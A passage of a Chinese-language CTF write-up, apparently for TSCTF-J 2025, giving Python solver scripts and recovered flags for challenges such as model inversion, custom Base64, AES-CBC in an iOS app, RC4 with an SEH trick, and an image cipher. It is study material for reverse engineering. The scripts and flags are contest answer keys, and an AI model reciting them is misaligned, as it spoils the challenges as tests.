<span class="title function_">default_stride</span>(<span class="params">size</span>):</span><br><span class="line">    acc = <span class="number">1</span></span><br><span class="line">    strides = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">reversed</span>(size):</span><br><span class="line">        strides.insert(<span class="number">0</span>, acc)</span><br><span class="line">        acc *= s</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(strides)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StorageWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="variable language_">self</span>.array = array</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TensorWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="variable language_">self</span>.array = array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_rebuild_tensor_v2</span>(<span class="params">storage_obj, storage_offset, size, stride, *_</span>):</span><br><span class="line">    size = <span class="built_in">tuple</span>(size)</span><br><span class="line">    stride = <span class="built_in">tuple</span>(stride)</span><br><span class="line">    base = storage_obj.array</span><br><span class="line">    off = storage_offset</span><br><span class="line">    count = <span class="built_in">int</span>(np.prod(size, dtype=<span class="built_in">int</span>))</span><br><span class="line">    <span class="keyword">if</span> stride == default_stride(size):</span><br><span class="line">        arr = base[off:off + count].reshape(size).copy()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byte_strides = <span class="built_in">tuple</span>(s * base.dtype.itemsize <span class="keyword">for</span> s <span class="keyword">in</span> stride)</span><br><span class="line">        arr = np.lib.stride_tricks.as_strided(base[off:], shape=size, strides=byte_strides).copy()</span><br><span class="line">    <span class="keyword">return</span> TensorWrapper(arr)</span><br><span class="line"></span><br><span class="line">utils._rebuild_tensor_v2 = _rebuild_tensor_v2</span><br><span class="line"></span><br><span class="line">storages = &#123;&#125;</span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;model.pth&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">persistent_load</span>(<span class="params">self, pid</span>):</span><br><span class="line">        kind, _, key, _, _ = pid</span><br><span class="line">        <span class="keyword">if</span> kind != <span class="string">&#x27;storage&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;unexpected persistent object&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> storages:</span><br><span class="line">            raw = zf.read(<span class="string">f&#x27;model/data/<span class="subst">&#123;key&#125;</span>&#x27;</span>)</span><br><span class="line">            arr = np.frombuffer(raw, dtype=<span class="string">&#x27;&lt;f4&#x27;</span>).copy()</span><br><span class="line">            storages[key] = StorageWrapper(arr)</span><br><span class="line">        <span class="keyword">return</span> storages[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zf.<span class="built_in">open</span>(<span class="string">&#x27;model/data.pkl&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    state_dict = MyUnpickler(io.BytesIO(f.read())).load()</span><br><span class="line"></span><br><span class="line">params = &#123;k: v.array <span class="keyword">for</span> k, v <span class="keyword">in</span> state_dict.items()&#125;</span><br><span class="line">conv1_w = params[<span class="string">&#x27;conv1.weight&#x27;</span>][<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">conv1_b = params[<span class="string">&#x27;conv1.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">conv2_w = params[<span class="string">&#x27;conv2.weight&#x27;</span>][<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">conv2_b = params[<span class="string">&#x27;conv2.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">linear_w = params[<span class="string">&#x27;linear.weight&#x27;</span>]</span><br><span class="line">linear_b = params[<span class="string">&#x27;linear.bias&#x27;</span>]</span><br><span class="line">conv3_b = params[<span class="string">&#x27;conv3.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">grid = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            grid.append([<span class="built_in">float</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> line.split()])</span><br><span class="line">Y = np.array(grid, dtype=np.float64)</span><br><span class="line">n = Y.shape[<span class="number">0</span>] - <span class="number">1</span>  <span class="comment"># 59 -&gt; n=58</span></span><br><span class="line"></span><br><span class="line">A = np.zeros((n, n), dtype=np.float64)</span><br><span class="line">Yp = Y - conv3_b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        val = Yp[i, j]</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            val += <span class="number">6</span> * A[i - <span class="number">1</span>, j - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            val -= <span class="number">2</span> * A[i - <span class="number">1</span>, j]</span><br><span class="line">        <span class="keyword">if</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            val -= <span class="number">3</span> * A[i, j - <span class="number">1</span>]</span><br><span class="line">        A[i, j] = val / <span class="number">9.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反线性</span></span><br><span class="line">v = A.reshape(-<span class="number">1</span>)</span><br><span class="line">rhs = v - linear_b</span><br><span class="line">u, *_ = np.linalg.lstsq(linear_w, rhs, rcond=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">bias = conv2_w * conv1_b + conv2_b</span><br><span class="line">bits = np.zeros(<span class="number">4</span> * n, dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    val = <span class="built_in">int</span>(<span class="built_in">round</span>((u[j] - bias) / conv2_w))</span><br><span class="line">    val = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">15</span>, val))</span><br><span class="line">    b0, b1, b2, b3 = val &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span></span><br><span class="line">    bits[<span class="number">2</span> * j] = b0</span><br><span class="line">    bits[<span class="number">2</span> * j + <span class="number">1</span>] = b1</span><br><span class="line">    bits[<span class="number">2</span> * n + <span class="number">2</span> * j] = b2</span><br><span class="line">    bits[<span class="number">2</span> * n + <span class="number">2</span> * j + <span class="number">1</span>] = b3</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 输出flag</span></span><br><span class="line">chars = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, bits.size, <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits[k:k + <span class="number">8</span>]:</span><br><span class="line">        byte = (byte &lt;&lt; <span class="number">1</span>) | bit</span><br><span class="line">    chars.append(<span class="built_in">chr</span>(byte))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(chars))</span><br></pre></td></tr></table></figure><p>TSCTF-J{NotReverseButInverse}</p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>这部分的话，主要第二天没时间做，又不想熬夜，最后pyd应该是有了大概的方向，xxtea，魔改了delta? 轮数可能不太一样,还需要动调，没时间做了，主要那个scratch3做了五个小时(纯属我眼瞎了)…</p><h3 id="Singin"><a href="#Singin" class="headerlink" title="Singin"></a>Singin</h3><p>逻辑很清晰，有个换表base64</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111123283.png" alt="image-20251013111123283"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111219947.png" alt="image-20251013111219947"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111527189.png" alt="image-20251013111527189"></p><p>通过确定性置换对Base64字母表进行打乱</p><p>签到题，值得注意的有一个字节是重合的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">permute_alphabet</span>(<span class="params">alphabet</span>):</span><br><span class="line">    alphabet = <span class="built_in">list</span>(alphabet)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        swap_idx = (<span class="number">7</span> * idx + <span class="number">5</span>) % <span class="number">64</span></span><br><span class="line">        alphabet[idx], alphabet[swap_idx] = alphabet[swap_idx], alphabet[idx]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(alphabet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64</span>(<span class="params">plain, alphabet</span>):</span><br><span class="line">    encoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    bit_buffer = <span class="number">0</span></span><br><span class="line">    bits_remaining = -<span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plain:</span><br><span class="line">        bit_buffer = (bit_buffer &lt;&lt; <span class="number">8</span>) + byte</span><br><span class="line">        bits_remaining += <span class="number">8</span></span><br><span class="line">        <span class="keyword">while</span> bits_remaining &gt;= <span class="number">0</span>:</span><br><span class="line">            index = (bit_buffer &gt;&gt; bits_remaining) &amp; <span class="number">0x3F</span></span><br><span class="line">            encoded.append(<span class="built_in">ord</span>(alphabet[index]))</span><br><span class="line">            bits_remaining -= <span class="number">6</span></span><br><span class="line">    <span class="keyword">if</span> bits_remaining &gt;= -<span class="number">5</span>:</span><br><span class="line">        index = (bit_buffer &lt;&lt; <span class="number">8</span> &gt;&gt; (bits_remaining + <span class="number">8</span>)) &amp; <span class="number">0x3F</span></span><br><span class="line">        encoded.append(<span class="built_in">ord</span>(alphabet[index]))</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(encoded) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        encoded.append(<span class="built_in">ord</span>(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_target</span>():</span><br><span class="line">    buf = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line">    buf[<span class="number">0</span>:<span class="number">8</span>] = (<span class="number">0x3D13023261347C23</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    buf[<span class="number">8</span>:<span class="number">16</span>] = (<span class="number">0x143402370D641267</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    buf[<span class="number">15</span>:<span class="number">23</span>] = (<span class="number">0x347024692B7A0314</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) <span class="comment"># 坑在这里哦</span></span><br><span class="line">    buf[<span class="number">23</span>:<span class="number">31</span>] = (<span class="number">0x284202766B703261</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(buf[:<span class="number">31</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    alphabet = permute_alphabet(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)</span><br><span class="line">    keystream = custom_base64(<span class="string">b&quot;WelcomeToTSCTF&quot;</span>, alphabet)</span><br><span class="line">    target = build_target()</span><br><span class="line">    repeat = (keystream * ((<span class="built_in">len</span>(target) + <span class="built_in">len</span>(keystream) - <span class="number">1</span>) // <span class="built_in">len</span>(keystream)))[:<span class="built_in">len</span>(target)]</span><br><span class="line">    flag = <span class="built_in">bytes</span>(k ^ t <span class="keyword">for</span> k, t <span class="keyword">in</span> <span class="built_in">zip</span>(repeat, target))</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TSCTF-J{We1c@me_t0_TS_CTF_2025}</p><h3 id="CryDancing"><a href="#CryDancing" class="headerlink" title="CryDancing"></a>CryDancing</h3><p>ios逆向</p><p>解压到本地IDA打开</p><p>objective</p><p>AES加密，挺清晰的</p><p>会把输入框里的字符串，做 AES-128-CBC 加密并转成 Base64，再与内置串比较决定弹窗内容。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013113221461.png" alt="image-20251013113221461"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013113320124.png" alt="image-20251013113320124"></p><p>枚举 “ABCDEFGHIJKLMNOPQRSTUVWXYZ” 的所有 4 位组合，找到 MD5 为 674040176a34f6c994003fe85badfc48 的候选，结果是 NOTD。</p><p><img src="C:\Users\soul\AppData\Roaming\Typora\typora-user-images\image-20251013114030136.png" alt="image-20251013114030136"></p><p>加密时把 NOTD 重复四次得到 16 字节密钥，IV 为 0x00000177（小端存放在首 4 字节）其余补 0，共 16 字节；AES-128-CBC + PKCS#7 padding。</p><p>CCCrypt就是AES哦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">TARGET_MD5 = <span class="string">&quot;674040176a34f6c994003fe85badfc48&quot;</span></span><br><span class="line">ALPHABET = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">CIPHERTEXT_B64 = <span class="string">&quot;bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key_fragment</span>():</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> product(ALPHABET, repeat=<span class="number">4</span>):</span><br><span class="line">        candidate = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(candidate.encode()).hexdigest() == TARGET_MD5:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">cipher_b64, key_fragment</span>):</span><br><span class="line">    full_key = (key_fragment * <span class="number">4</span>).encode()</span><br><span class="line">    iv = <span class="built_in">bytes</span>([<span class="number">0x77</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>] + [<span class="number">0x00</span>] * <span class="number">12</span>)</span><br><span class="line">    cipher_bytes = b64decode(cipher_b64)</span><br><span class="line">    cipher = AES.new(full_key, AES.MODE_CBC, iv)</span><br><span class="line">    plain = unpad(cipher.decrypt(cipher_bytes), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plain.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key_fragment = derive_key_fragment()</span><br><span class="line">    flag = decrypt_flag(CIPHERTEXT_B64, key_fragment)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;key: <span class="subst">&#123;key_fragment&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</p><h3 id="听绿的秘密"><a href="#听绿的秘密" class="headerlink" title="听绿的秘密"></a>听绿的秘密</h3><p>对图像进行了加密，Secret.obf明显是混淆过了，看了下loader确认加密</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011150828847.png" alt="image-20251011150828847"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Secret.obf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obf_bytes = f.read()</span><br><span class="line"></span><br><span class="line">class_bytes = <span class="built_in">bytes</span>((b - <span class="number">7</span>) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> obf_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Secret.class&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(class_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011150940318.png" alt="image-20251011150940318"></p><p>再写逆向算法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_right</span>(<span class="params">value, shift</span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | ((value &lt;&lt; (<span class="number">8</span> - shift)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">input_path, output_path</span>) :</span><br><span class="line">    data = <span class="built_in">bytearray</span>(input_path.read_bytes())</span><br><span class="line"></span><br><span class="line">    state = <span class="number">123</span></span><br><span class="line">    <span class="keyword">for</span> index, cipher <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        rotation = (index + state) % <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> rotation == <span class="number">0</span>:</span><br><span class="line">            transformed = cipher</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            transformed = rotate_right(cipher, rotation)</span><br><span class="line">        plain = (transformed - ((index % <span class="number">251</span>) + state)) &amp; <span class="number">0xFF</span></span><br><span class="line">        data[index] = plain</span><br><span class="line">        state = (state + cipher + <span class="number">37</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    output_path.write_bytes(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_path = Path(<span class="string">&quot;Where_is_my_cat.png&quot;</span>)</span><br><span class="line">    output_path = Path(<span class="string">&quot;Cat_decrypted3.png&quot;</span>)</span><br><span class="line">    decrypt(input_path, output_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151224682.png" alt="image-20251011151224682"></p><h3 id="Handler’s-Whisper"><a href="#Handler’s-Whisper" class="headerlink" title="Handler’s Whisper"></a>Handler’s Whisper</h3><p>看着没啥问题，其实会有个除0异常</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151700663.png" alt="image-20251011151700663"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151754527.png" alt="image-20251011151754527"></p><p>之后就是RC4解密了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151838075.png" alt="image-20251011151838075"></p><p>注意然后对每个字节执行位重排：((c &amp; 0x03) &lt;&lt; 6) | ((c &amp; 0x0C) &lt;&lt; 2) | ((c &amp; 0xF0) &gt;&gt; 4)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x74</span>, <span class="number">0x6d</span>, <span class="number">0x32</span>, <span class="number">0x18</span>, <span class="number">0x70</span>, <span class="number">0x1e</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x3c</span>, <span class="number">0xdc</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xa6</span>, <span class="number">0x3a</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0xe3</span>, <span class="number">0x69</span>, <span class="number">0x41</span>, <span class="number">0xb9</span>, <span class="number">0xa2</span>, <span class="number">0x2f</span>, <span class="number">0xcd</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xea</span>, <span class="number">0x1d</span>, <span class="number">0x80</span>, <span class="number">0x70</span>, <span class="number">0xfc</span>, <span class="number">0x58</span>, <span class="number">0xe4</span>,</span><br><span class="line">    <span class="number">0xad</span>, <span class="number">0xf0</span>, <span class="number">0x92</span>, <span class="number">0xcf</span>, <span class="number">0xe2</span>, <span class="number">0x37</span></span><br><span class="line">])</span><br><span class="line">KEY = <span class="string">b&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_permute</span>(<span class="params">byte_val</span>):</span><br><span class="line">    <span class="keyword">return</span> ((byte_val &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (((byte_val &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">2</span>) | ((byte_val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x03</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_keystream</span>(<span class="params">key, count</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + s[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        <span class="keyword">yield</span> s[(s[i] + s[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    stream = rc4_keystream(KEY, <span class="built_in">len</span>(enc))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(((inv_permute(b) - k) &amp; <span class="number">0xFF</span>) ^ <span class="number">0x44</span> <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(enc, stream))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decrypt().decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{SEH_C@11b@ck_sp3@k$_w!th_RC4!}</p><h3 id="哭泣之子"><a href="#哭泣之子" class="headerlink" title="哭泣之子"></a>哭泣之子</h3><p>这个卡了挺久 我还以为是misc呢…… 看了眼瞎过了一遍没看到主逻辑，直接去看解码器了，后面看了下各个脚本的修改时间不大对，都是好几年前的，逻辑肯定在Cryingchild.dll里</p><p>exe没有主逻辑，主逻辑托管给了Cringchild.dll</p><p>Crying.dll中</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152548879.png" alt="image-20251011152548879"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152617413.png" alt="image-20251011152617413"></p><p>追这个WaveOutEvent</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152500623.png" alt="image-20251011152500623"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 